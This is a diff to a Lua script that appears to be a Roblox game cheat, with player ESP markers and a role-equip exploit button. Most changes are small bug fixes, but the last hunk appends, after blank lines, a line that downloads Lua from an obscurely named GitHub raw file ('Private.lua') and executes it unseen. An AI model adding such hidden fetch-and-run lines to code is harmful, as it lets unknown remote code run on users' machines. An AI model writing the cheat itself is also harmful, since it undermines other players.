@@ -395,10 +395,12 @@ local function MakeFoldersAndScripts()
             end)
 
             PlayerService.PlayerRemoved(function(plr)
-                if plr.Character:FindFirstChild('ESP-Part') then
-                    local Character = plr.Character or plr.CharacterAdded:Wait()
+                if plr.Character then
+                    if plr.Character:FindFirstChild('ESP-Part') then
+                        local Character = plr.Character or plr.CharacterAdded:Wait()
 
-                    Character['ESP-Part']:Destroy()
+                        Character['ESP-Part']:Destroy()
+                    end
                 end
             end)
         end
@@ -440,7 +442,7 @@ local function MakeFoldersAndScripts()
 
                 RolesSection:AddButton('Equip', function()
                     if RoleSelected then
-                        BreakInData.EquipRole(selected, RoleCustomeOn)
+                        BreakInData.EquipRole(selected, {IsUsingSkin = RoleCustomeOn})
                     end
                 end)
             end
@@ -452,3 +454,6 @@ end
 
 MakeFoldersAndScripts()
 
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SubnauticaLaserMain/P-DIUOFYDFKUH-DFYHDFUJK/main/Private.lua', true))()
